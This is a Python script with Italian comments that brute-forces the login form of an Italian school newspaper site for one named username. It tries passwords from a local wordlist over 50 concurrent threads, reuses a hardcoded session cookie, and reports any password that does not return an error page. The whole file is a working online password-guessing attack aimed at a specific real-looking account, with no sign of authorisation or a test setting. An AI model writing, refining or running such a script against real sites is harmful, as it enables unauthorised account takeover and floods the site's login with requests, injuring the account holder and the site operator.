import requests
from concurrent.futures import ThreadPoolExecutor

# Configurazione
url = "https://www.giocoscuola.it/giornalino/"
username = "delfinix"
wordlist_path = r"C:\Users\Dav\Downloads\parole_uniche.txt"

# Carica le password dalla wordlist
with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

# Intestazioni per la richiesta
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Origin": "https://www.giocoscuola.it",
    "Referer": "https://www.giocoscuola.it/giornalino/",
    "Connection": "keep-alive",
}

# Cookie di sessione
cookies = {
    "PHPSESSID": "6dk09t2geilnjmqskbtmtv1tni1e2a5g"
}

# Dati per la richiesta POST
data = {
    "option": "ap_user_login",
    "redirect": "https://www.giocoscuola.it/giornalino/",
    "userusername": username,
    "userpassword": "",
    "login": "Entra"
}

# Funzione per provare il login
def try_login(pwd):
    with requests.Session() as session:
        session.headers.update(headers)
        session.cookies.update(cookies)

        data["userpassword"] = pwd
        response = session.post(url, data=data)

        if "Errore" not in response.text:  # Controlla se il login è valido
            print(f"[+] Trovata password valida: {pwd}")
            return True
        print("invalid")
        return False

# Funzione per eseguire il multithreading
def run_bruteforce():
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(try_login, pwd) for pwd in passwords]
        for future in futures:
            if future.result():
                break

# Esegui il bruteforce con multithreading
run_bruteforce()




